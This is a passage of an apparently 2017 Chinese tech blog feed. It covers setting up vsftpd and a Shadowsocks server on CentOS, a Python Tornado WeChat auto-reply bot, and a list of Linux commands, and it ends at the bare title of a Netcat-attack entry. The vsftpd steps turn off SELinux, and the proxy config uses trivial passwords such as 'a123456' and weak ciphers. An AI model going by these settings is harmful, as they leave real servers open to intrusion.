        <content type="html"><![CDATA[<p>　　　vsftpd 是“very secure FTP daemon”的缩写，安全性是它的一个最大的特点。vsftpd 是一个 UNIX 类操作系统上运行的服务器的名字，它可以运行在诸如 Linux、BSD、Solaris、 HP-UNIX等系统上面，是一个完全免费的、开发源代码的ftp服务器软件，支持很多其他的 FTP 服务器所不支持的特征。比如：非常高的安全性需求、带宽限制、良好的可伸缩性、可创建虚拟用户、支持IPv6、速率高等。</p><a id="more"></a><p><br></p><h5 id="一-通过yum安装vsftp"><a href="#一-通过yum安装vsftp" class="headerlink" title="一.     通过yum安装vsftp"></a>一.     通过yum安装vsftp</h5><pre><code>yum install -y vsftpd</code></pre><h5 id="二-修改vsftpd的配置文件"><a href="#二-修改vsftpd的配置文件" class="headerlink" title="二.     修改vsftpd的配置文件"></a>二.     修改vsftpd的配置文件</h5><pre><code>vi /etc/vsftpd/vsftpd.conf</code></pre><p>修改配置文件</p><pre><code>1. 不允许匿名访问    anonymous_enable=NO       ## 允许匿名登陆是 默认账户为 ftp@ip:212. 允许使用本地账户进行ftp登陆验证:    local_enable=YES3.    使用户不能离开主目录    chroot_local_user=YES    chroot_list_enable=YES    chroot_list_file=/etc/vsftpd/chroot_list</code></pre><p>配置文件最后添加</p><pre><code>allow_writeable_chroot=YES</code></pre><p>如果/etc/vsftpd/chroot_list不存在，则需要创建该文件</p><pre><code>touch /etc/vsftpd/chroot_list</code></pre><p>重启vsftpd服务:</p><pre><code>systemctl restart vsftpd.service</code></pre><p>新建ftp用户</p><pre><code>useradd -d /var/ftp/public_root -g ftp -s /sbin/nologin ftpuser</code></pre><p>密码:<br>        passwd ftpuser</p><h5 id="关闭防火墙-和-SELinux"><a href="#关闭防火墙-和-SELinux" class="headerlink" title="关闭防火墙 和 SELinux:"></a>关闭防火墙 和 SELinux:</h5><pre><code>setenforce 0   # 设置SELinux 成为permissive模式  （关闭SELinux）setenforce 1   # 设置SELinux 成为enforcing模式   （开启SELinux）# 或者修改配置vi /etc/selinux/config# SELINUX=enforcing# 注释掉# SELINUXTYPE=targeted# 注释掉SELINUX=disabled# 增加:wq! #保存退出setenforce 0</code></pre><p>防火墙添加Ftp服务:</p><pre><code>firewall-cmd --permanent --zone=public --add-service=ftp    firewall-cmd --reload</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>CentOS 7 搭建Shadowsock</title>
      <link href="/2017/07/11/yunwei/CentOS-7-%E6%90%AD%E5%BB%BAShadowsock/"/>
      <url>/2017/07/11/yunwei/CentOS-7-%E6%90%AD%E5%BB%BAShadowsock/</url>
      
        <content type="html"><![CDATA[<p><a href="https://github.com/shadowsocks" target="_blank" rel="noopener">Shadowsocks</a>是什么？</p><p>　　　　Shadowsocks是一个安全的Socks代理，用于保护网络流量不被干扰，也是开源的项目；主要特性包括：</p><p>　　　　　　a、快速（异步I/O和事件驱动程序）。</p><p>　　　　　　b、安全（所有的流量都经过加密算法加密，支持自定义算法）。</p><p>　　　　　　c、支持移动客户端（专为移动设备和无线网络优化）。</p><p>　　　　　　d、跨平台（可运行于包括PC，Mac，手机（Android和iOS）和路由器（OpenWrt）在内的多种平台上）。</p><p>　　　　　　e、使用Socks5协议和可自定义密码的工业级算法加密，流量在网络传输过程中不易被他人读取。</p><p>　　　　　　f、开源。</p><p>　　　　　　g、易于维护。</p><a id="more"></a><p>1.安装python-pip:</p><pre><code>yum install python-setuptools &amp;&amp; easy_install pip</code></pre><p>2.安装 shadowsock:</p><pre><code>pip install --upgrade pippip install shadowsocks</code></pre><p>2.1 配置 shadowsocks</p><pre><code>/etc/shadowsocks.json内容如下:    {    &quot;server&quot;: &quot;0.0.0.0&quot;,    &quot;server_port&quot;: 8388,    &quot;password&quot;: &quot;a123456&quot;,    &quot;method&quot;: &quot;aes-256-cfb&quot;    }配置多个port端口:{&quot;server&quot;: &quot;0.0.0.0&quot;,&quot;port_password&quot;: {     &quot;8388&quot;:&quot;a123456&quot;,     &quot;8387&quot;:&quot;b123456&quot;,     &quot;8386&quot;:&quot;c123456&quot; },&quot;method&quot;: &quot;aes-256-cfb&quot;}method:为加密方法，可选aes-128-cfb, aes-192-cfb, aes-256-cfb, bf-cfb, cast5-cfb, des-cfb, rc4-md5, chacha20, salsa20, rc4, table</code></pre><p>2.2 配置自启脚本:</p><pre><code>vi /etc/systemd/system/shadowsocks.service 内容如下:    [Unit]    Description=Shadowsocks    [Service]    TimeoutStartSec=0    ExecStart=/usr/bin/ssserver -c /etc/shadowsocks.json    [Install]    WantedBy=multi-user.target</code></pre><p>2.3 启动shadowsock服务: </p><pre><code>systemctl enable shadowsocks #加入开机启动 systemctl start shadowsocks #启动 systemctl restart shadowsocks　 #重新启动服务</code></pre><p>3.防火墙配置</p><p>若是不是存在别的服务程序不为默认端口请修改:</p><pre><code>例如: ssh 使用 28392 firewall-cmd --zone=public --add-port=28392/tcp --permanent firewall-cmd --reload</code></pre><p>​    </p><p>shadowsock  需要修改端口:</p><pre><code>firewall-cmd --zone=public --add-port=8388/tcp --permanentsystemctl restart firewalld.service    # 启动防火墙   firewall-cmd --list-cmd        # 查看防火墙规则</code></pre><ol><li><p>客户端使用sslocal 进行科学上网:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sslocal  -c  shadowsock.json -d start // 并后台启动</span><br></pre></td></tr></table></figure><ol><li><p>cat shadowsock.json </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">&quot;server&quot;: &quot;your-ip&quot;,</span><br><span class="line">&quot;server_port&quot;: your-port,</span><br><span class="line">&quot;local_port&quot;: 1080,</span><br><span class="line">&quot;password&quot;: &quot;your-passwd&quot;,</span><br><span class="line">&quot;timeout&quot;: 60,</span><br><span class="line">&quot;method&quot;: &quot;aes-256-cfb&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>报错: AttributeError: /usr/lib/x86_64-linux-gnu/libcrypto.so.1.1: undefined symbol: EVP_CIPHER_CTX_cleanup</p><blockquote><p>  pip install -U git+<a href="https://github.com/shadowsocks/shadowsocks.git@master" target="_blank" rel="noopener">https://github.com/shadowsocks/shadowsocks.git@master</a></p></blockquote></li></ol></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Shadowsock </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Python + Tornado 搭建自动回复微信公众号</title>
      <link href="/2017/07/10/gram/python_tornado_%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
      <url>/2017/07/10/gram/python_tornado_%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/</url>
      
        <content type="html"><![CDATA[<p>用于个人微信订阅号，实现消息自动回复与自动聊天</p><ol><li>微信公众号</li><li>图灵API接口</li></ol><a id="more"></a><p><br></p><p>1    通过 pip 安装 wechat-python-sdk ， Requests 以及 Tornado  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pip install tornado</span><br><span class="line">pip install wechat-sdk</span><br><span class="line">pip install requests</span><br></pre></td></tr></table></figure><p>2      订阅号申请<br>要搭建订阅号，首先需要在微信公众平台官网进行注册，注册网址: <a href="https://mp.weixin.qq.com" target="_blank" rel="noopener">微信公众平台</a>。<br>目前个人用户可以免费申请微信订阅号，虽然很多权限申请不到，但是基本的消息回复是没有问题的。  </p><ul><li>服务器接入</li></ul><p>具体的接入步骤可以参考官网上的<a href="https://mp.weixin.qq.com/wiki/8/f9a0b8382e0b77d87b3bcc1ce6fbc104.html" target="_blank" rel="noopener">接入指南</a>。</p><p>本订阅号的配置为： </p><p><img src="/img/python/微信公众号配置.png" alt="微信公众号配置">    </p><p>进行修改配置，提交时，需要验证服务器地址的有效性</p><p><img src="/img/python/验证服务器地址的有效性.png" alt="验证服务器地址的有效性"><br>wechat.py  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">import tornado.escape</span><br><span class="line">import tornado.web</span><br><span class="line"></span><br><span class="line">from wechat_sdk import WechatConf</span><br><span class="line">conf = WechatConf(</span><br><span class="line">    token=&apos;your_token&apos;, # 你的公众号Token</span><br><span class="line">    appid=&apos;your_appid&apos;, # 你的公众号的AppID</span><br><span class="line">    appsecret=&apos;your_appsecret&apos;, # 你的公众号的AppSecret</span><br><span class="line">    encrypt_mode=&apos;safe&apos;,  # 可选项：normal/compatible/safe，分别对应于 明文/兼容/安全 模式</span><br><span class="line">    encoding_aes_key=&apos;your_encoding_aes_key&apos;  # 如果传入此值则必须保证同时传入 token, appid</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">from wechat_sdk import WechatBasic</span><br><span class="line">wechat = WechatBasic(conf=conf)</span><br><span class="line"></span><br><span class="line">class WX(tornado.web.RequestHandler):</span><br><span class="line">    def get(self):</span><br><span class="line">        signature = self.get_argument(&apos;signature&apos;, &apos;default&apos;)</span><br><span class="line">        timestamp = self.get_argument(&apos;timestamp&apos;, &apos;default&apos;)</span><br><span class="line">        nonce = self.get_argument(&apos;nonce&apos;, &apos;default&apos;)</span><br><span class="line">        echostr = self.get_argument(&apos;echostr&apos;, &apos;default&apos;)</span><br><span class="line">        if signature != &apos;default&apos; and timestamp != &apos;default&apos; and nonce != &apos;default&apos; and echostr != &apos;default&apos; \</span><br><span class="line">                and wechat.check_signature(signature, timestamp, nonce):</span><br><span class="line">            self.write(echostr)</span><br><span class="line">        else:</span><br><span class="line">            self.write(&apos;Not Open&apos;)</span><br></pre></td></tr></table></figure><p>wechat_main.py</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">#coding:utf-8</span><br><span class="line"></span><br><span class="line">import tornado.web</span><br><span class="line">import tornado.httpserver</span><br><span class="line">from tornado.options import define, options</span><br><span class="line">import os</span><br><span class="line">import wechat</span><br><span class="line"></span><br><span class="line">settings = &#123;</span><br><span class="line">            &apos;static_path&apos;: os.path.join(os.path.dirname(__file__), &apos;static&apos;),</span><br><span class="line">            &apos;template_path&apos;: os.path.join(os.path.dirname(__file__), &apos;view&apos;),</span><br><span class="line">            &apos;cookie_secret&apos;: &apos;xxxxxxxxxxx&apos;,</span><br><span class="line">            &apos;login_url&apos;: &apos;/&apos;,</span><br><span class="line">            &apos;session_secret&apos;: &quot;xxxxxxxxxxxxxxxxxxxxxxx&quot;,</span><br><span class="line">            &apos;session_timeout&apos;: 3600,</span><br><span class="line"></span><br><span class="line">            &apos;port&apos;: 8888,</span><br><span class="line">            &apos;wx_token&apos;: &apos;your_token&apos;,</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">web_handlers = [</span><br><span class="line">        (r&apos;/wechat&apos;, wechat.WX),</span><br><span class="line">        ]</span><br><span class="line"></span><br><span class="line">#define(&quot;port&quot;, default=settings[&apos;port&apos;], help=&quot;run on the given port&quot;, type=int)</span><br><span class="line"></span><br><span class="line">from tornado.options import define, options</span><br><span class="line">define (&quot;port&quot;, default=8888, help=&quot;run on the given port&quot;, type=int)</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    app = tornado.web.Application(web_handlers, **settings)</span><br><span class="line">    tornado.options.parse_command_line()</span><br><span class="line">    http_server = tornado.httpserver.HTTPServer(app)</span><br><span class="line">    http_server.listen(options.port)</span><br><span class="line">    tornado.ioloop.IOLoop.instance().start()</span><br></pre></td></tr></table></figure><p>cookie_secret  session_secret   可以随便填写;<br>配置好程序源代码后运行，确认运行无误后再在公众号设置页面点击 提交 ，如果程序运行没问题，会显示接入成功。</p><p>3    接入图灵机器人<br>要接入图灵机器人，首先需要在官网申请API Key。  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">class TulingAutoReply:</span><br><span class="line">    def __init__(self, tuling_key, tuling_url):</span><br><span class="line">        self.key = tuling_key</span><br><span class="line">        self.url = tuling_url</span><br><span class="line"></span><br><span class="line">    def reply(self, unicode_str):</span><br><span class="line">        body = &#123;&apos;key&apos;: self.key, &apos;info&apos;: unicode_str.encode(&apos;utf-8&apos;)&#125;</span><br><span class="line">        r = requests.post(self.url, data=body)</span><br><span class="line">        r.encoding = &apos;utf-8&apos;</span><br><span class="line">        resp = r.text</span><br><span class="line">        if resp is None or len(resp) == 0:</span><br><span class="line">            return None</span><br><span class="line">        try:</span><br><span class="line">            js = json.loads(resp)</span><br><span class="line">            if js[&apos;code&apos;] == 100000:</span><br><span class="line">                return js[&apos;text&apos;].replace(&apos;&lt;br&gt;&apos;, &apos;\n&apos;)</span><br><span class="line">            elif js[&apos;code&apos;] == 200000:</span><br><span class="line">                return js[&apos;url&apos;]</span><br><span class="line">            else:</span><br><span class="line">                return None</span><br><span class="line">        except Exception:</span><br><span class="line">            traceback.print_exc()</span><br><span class="line">            return None</span><br></pre></td></tr></table></figure><p>4    编写公众号自动回复代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">auto_reply = TulingAutoReply(key, url) # key和url填入自己申请到的图灵key以及图灵请求url</span><br><span class="line"></span><br><span class="line">class WX(tornado.web.RequestHandler):</span><br><span class="line">    def wx_proc_msg(self, body):</span><br><span class="line">        try:</span><br><span class="line">            wechat.parse_data(body)</span><br><span class="line">        except ParseError:</span><br><span class="line">            print(&apos;Invalid Body Text&apos;)</span><br><span class="line">            return</span><br><span class="line">        if isinstance(wechat.message, TextMessage): # 消息为文本消息</span><br><span class="line">            content = wechat.message.content</span><br><span class="line">            reply = auto_reply.reply(content)</span><br><span class="line">            if reply is not None:</span><br><span class="line">                return wechat.response_text(content=reply)</span><br><span class="line">            else:</span><br><span class="line">                return wechat.response_text(content=u&quot;不知道你说的什么&quot;)</span><br><span class="line">        return wechat.response_text(content=u&apos;知道了&apos;)</span><br><span class="line"></span><br><span class="line">    def post(self):</span><br><span class="line">        signature = self.get_argument(&apos;signature&apos;, &apos;default&apos;)</span><br><span class="line">        timestamp = self.get_argument(&apos;timestamp&apos;, &apos;default&apos;)</span><br><span class="line">        nonce = self.get_argument(&apos;nonce&apos;, &apos;default&apos;)</span><br><span class="line">        if signature != &apos;default&apos; and timestamp != &apos;default&apos; and nonce != &apos;default&apos; \</span><br><span class="line">                and wechat.check_signature(signature, timestamp, nonce):</span><br><span class="line">            body = self.request.body.decode(&apos;utf-8&apos;)</span><br><span class="line">            try:</span><br><span class="line">                result = self.wx_proc_msg(body)</span><br><span class="line">                if result is not None:</span><br><span class="line">                    self.write(result)</span><br><span class="line">            except IOError as e:</span><br><span class="line">                return</span><br></pre></td></tr></table></figure><p>最终 wechat.py 代码如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">import tornado.escape</span><br><span class="line">import tornado.web</span><br><span class="line">#from goose import Goose, ParseError</span><br><span class="line">import json</span><br><span class="line">import requests</span><br><span class="line">import traceback</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">from wechat_sdk import WechatConf</span><br><span class="line">conf = WechatConf(</span><br><span class="line">    token=&apos;your_token&apos;, # 你的公众号Token</span><br><span class="line">    appid=&apos;your_appid&apos;, # 你的公众号的AppID</span><br><span class="line">    appsecret=&apos;your_appsecret&apos;, # 你的公众号的AppSecret</span><br><span class="line">    encrypt_mode=&apos;safe&apos;,  # 可选项：normal/compatible/safe，分别对应于 明文/兼容/安全 模式</span><br><span class="line">    encoding_aes_key=&apos;your_encoding_aes_key&apos;  # 如果传入此值则必须保证同时传入 token, appid</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">from wechat_sdk import WechatBasic</span><br><span class="line">wechat = WechatBasic(conf=conf)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class TulingAutoReply:</span><br><span class="line">    def __init__(self, tuling_key, tuling_url):</span><br><span class="line">        self.key = tuling_key</span><br><span class="line">        self.url = tuling_url</span><br><span class="line"></span><br><span class="line">    def reply(self, unicode_str):</span><br><span class="line">        body = &#123;&apos;key&apos;: self.key, &apos;info&apos;: unicode_str.encode(&apos;utf-8&apos;)&#125;</span><br><span class="line">        r = requests.post(self.url, data=body)</span><br><span class="line">        r.encoding = &apos;utf-8&apos;</span><br><span class="line">        resp = r.text</span><br><span class="line">        if resp is None or len(resp) == 0:</span><br><span class="line">            return None</span><br><span class="line">        try:</span><br><span class="line">            js = json.loads(resp)</span><br><span class="line">            if js[&apos;code&apos;] == 100000:</span><br><span class="line">                return js[&apos;text&apos;].replace(&apos;&lt;br&gt;&apos;, &apos;\n&apos;)</span><br><span class="line">            elif js[&apos;code&apos;] == 200000:</span><br><span class="line">                return js[&apos;url&apos;]</span><br><span class="line">            else:</span><br><span class="line">                return None</span><br><span class="line">        except Exception:</span><br><span class="line">            traceback.print_exc()</span><br><span class="line">            return None</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">auto_reply = TulingAutoReply(key, url) # key和url填入自己申请到的图灵key以及图灵请求url</span><br><span class="line"></span><br><span class="line">class WX(tornado.web.RequestHandler):</span><br><span class="line">    def wx_proc_msg(self, body):</span><br><span class="line">        try:</span><br><span class="line">            wechat.parse_data(body)</span><br><span class="line">        except ParseError:</span><br><span class="line">            print(&apos;Invalid Body Text&apos;)</span><br><span class="line">            return</span><br><span class="line">        if isinstance(wechat.message, TextMessage): # 消息为文本消息</span><br><span class="line">            content = wechat.message.content</span><br><span class="line">            reply = auto_reply.reply(content)</span><br><span class="line">            if reply is not None:</span><br><span class="line">                return wechat.response_text(content=reply)</span><br><span class="line">            else:</span><br><span class="line">                return wechat.response_text(content=u&quot;不知道你说的什么&quot;)</span><br><span class="line">        return wechat.response_text(content=u&apos;知道了&apos;)</span><br><span class="line"></span><br><span class="line">    def post(self):</span><br><span class="line">        signature = self.get_argument(&apos;signature&apos;, &apos;default&apos;)</span><br><span class="line">        timestamp = self.get_argument(&apos;timestamp&apos;, &apos;default&apos;)</span><br><span class="line">        nonce = self.get_argument(&apos;nonce&apos;, &apos;default&apos;)</span><br><span class="line">        if signature != &apos;default&apos; and timestamp != &apos;default&apos; and nonce != &apos;default&apos; \</span><br><span class="line">                and wechat.check_signature(signature, timestamp, nonce):</span><br><span class="line">            body = self.request.body.decode(&apos;utf-8&apos;)</span><br><span class="line">            try:</span><br><span class="line">                result = self.wx_proc_msg(body)</span><br><span class="line">                if result is not None:</span><br><span class="line">                    self.write(result)</span><br><span class="line">            except IOError as e:</span><br><span class="line">                return</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Linux 常用命令</title>
      <link href="/2017/07/09/commands/Linux_command/"/>
      <url>/2017/07/09/commands/Linux_command/</url>
      
        <content type="html"><![CDATA[<h3 id="本文将常用的Linux-命令按照功能划分从以下八个方面讲解"><a href="#本文将常用的Linux-命令按照功能划分从以下八个方面讲解" class="headerlink" title="本文将常用的Linux 命令按照功能划分从以下八个方面讲解:"></a>本文将常用的Linux 命令按照功能划分从以下八个方面讲解:</h3><p>　　　1.  文件管理<br>　　　2.  文件传输<br>　　　3.  文档编辑<br>　　　4.  磁盘管理<br>　　　5.  磁盘维护<br>　　　6.  网络通讯<br>　　　7.  系统管理<br>　　　8.  系统设置</p><a id="more"></a><p><br></p><h5 id="1-文件管理"><a href="#1-文件管理" class="headerlink" title="1.    文件管理"></a>1.    文件管理</h5><ol><li><p>cat<br>用法：cat [选项]… [文件]…<br> 将[文件]或标准输入组合输出到标准输出。</p></li><li><p>tail tailf<br>tail :  默认将文件的末尾10行输出到标准输出中;<br>tailf:  只显示新追加到文件的内容   等价于:   tail -f </p></li><li><p>cp<br>用法：cp [选项]… [-T] 源文件 目标文件<br>　或：cp [选项]… 源文件… 目录<br>　或：cp [选项]… -t 目录 源文件…<br>拷贝源文件 到目标地址， 可以选择多个源文件</p></li></ol><ol><li>mv<br>用法：mv [选项]… [-T] 源文件 目标文件<br>　或：mv [选项]… 源文件… 目录<br>　或：mv [选项]… -t 目录 源文件…<br>重命名源文件名为目标文件名, 或者是移动源文件到指定目录</li></ol><ol><li><p>rm<br>用法：rm [选项]… 文件…<br>移除 删除 文件;</p></li><li><p>od<br>用法：od [选项]… [文件]…<br>　或：od [-abcdfilosx]… [文件] [[+]偏移量[.][b]]<br>　或：od –traditional [选项]… [文件] [[+]偏移量[.][b] [+][标签][.][b]]</p><p>将指定文件以八进制形式(默认)转储到标准输出。如果指定了多于一个的文件<br>参数，程序会自动将输入的内容整合为列表并以同样的形式输出。<br>如果没有指定文件，或指定文件为”-“，程序从标准输入读取数据。</p></li></ol><ol><li><p>patch<br>patch 命令读取如何更改文件 的源文件指示信息，然后应用这些更改。源文件包含由 diff -c 或 -u 命令产生的差别列表（或者 diff 列表），以及一个或多个 diff 命令输出集（通常称为 hunks）。<br>patch 结合差异的文件， 进行补全; </p></li><li><p>diff </p><p>配合 patch:</p><pre><code>diff -ruN test1 test2 &gt; patch.log    # 生成patch文件patch test2 patch.log                # 利用patch文件和patch命令打补丁</code></pre></li><li><p>mkdir<br> 用法：mkdir [选项]… 目录…</p><pre><code>创建一个空的目录</code></pre></li></ol><ol><li>rmdir<br>用法：rm [选项]… 文件…<br>删除一个空目录</li></ol><ol><li>chmod<br>用法：chmod [选项]… 模式[,模式]… 文件…<br>　或：chmod [选项]… 八进制模式 文件…<br>　或：chmod [选项]… –reference=参考文件 文件…<br>更改文件的属性:  r  w  x</li></ol><ol><li><p>chown<br>  用法：chown [选项]… [所有者][:[组]] 文件…<br>   　或：chown [选项]… –reference=参考文件 文件…<br>   更改文件的所属用户和所属组;</p></li><li><p>which<br>Usage: /usr/bin/which [options] [–] COMMAND […]<br>将命令的路径输出命令行界面;</p></li></ol><ol><li>file<br>Usage: file [OPTION…] [FILE…]<br>探测给定文件的类型</li></ol><p><br></p><h5 id="2-文件传输"><a href="#2-文件传输" class="headerlink" title="2. 文件传输"></a>2. 文件传输</h5><ol><li>ftp</li><li>scp</li><li>rz/sz  (串口)</li></ol><p><br></p><h5 id="3-文档编辑"><a href="#3-文档编辑" class="headerlink" title="3. 文档编辑"></a>3. 文档编辑</h5><ol><li>grep</li><li>sort</li><li>tr</li><li>wc</li><li>split</li><li>sed</li><li>awk</li></ol><p><br></p><h5 id="4-磁盘管理"><a href="#4-磁盘管理" class="headerlink" title="4. 磁盘管理"></a>4. 磁盘管理</h5><ol><li>ls</li><li>cd </li><li>df</li><li>du</li><li>pwd</li><li>tar</li><li>tree</li><li>find</li></ol><p><br></p><h5 id="5-磁盘维护"><a href="#5-磁盘维护" class="headerlink" title="5. 磁盘维护"></a>5. 磁盘维护</h5><ol><li>dd</li><li>fdisk</li><li>mkfd</li><li>mkswap</li><li>sync</li></ol><p><br></p><h5 id="6-网络通讯"><a href="#6-网络通讯" class="headerlink" title="6. 网络通讯"></a>6. 网络通讯</h5><ol><li>ifconfig</li><li>ip</li><li>nc</li><li>mesg</li><li>ping</li><li>netstat  [ss]  </li><li>telnet</li><li>traceroute</li><li>route</li></ol><p><br></p><h5 id="7-系统管理"><a href="#7-系统管理" class="headerlink" title="7. 系统管理"></a>7. 系统管理</h5><ol><li>date</li><li>free</li><li>kill</li><li>ps</li><li>last</li><li>w</li><li>whoami</li><li>nice </li><li>reboot</li><li>shutdown</li><li>su</li><li>sudo</li><li>top[htop]    </li></ol><p><br></p><h5 id="8-系统设置"><a href="#8-系统设置" class="headerlink" title="8. 系统设置"></a>8. 系统设置</h5><ol><li>alias [unlimit]</li><li>set   [unset]</li><li>chkconfig</li><li>service</li><li>crontab</li><li>at</li><li>export</li><li>passwd</li><li>ulimit</li></ol><p><br></p><h3 id="参照"><a href="#参照" class="headerlink" title="参照:"></a>参照:</h3><blockquote><p>  <a href="http://linuxtools-rst.readthedocs.io/zh_CN/latest/index.html" target="_blank" rel="noopener">Linux Tools Quick Tutorial</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 命令 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Commands </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Netcat 网络攻击 以及 应用</title>
      <link href="/2017/07/09/kali/NetCat%E5%AD%A6%E4%B9%A0%E4%BB%8B%E7%BB%8D/"/>
      <url>/2017/07/09/kali/NetCat%E5%AD%A6%E4%B9%A0%E4%BB%8B%E7%BB%8D/</url>
      
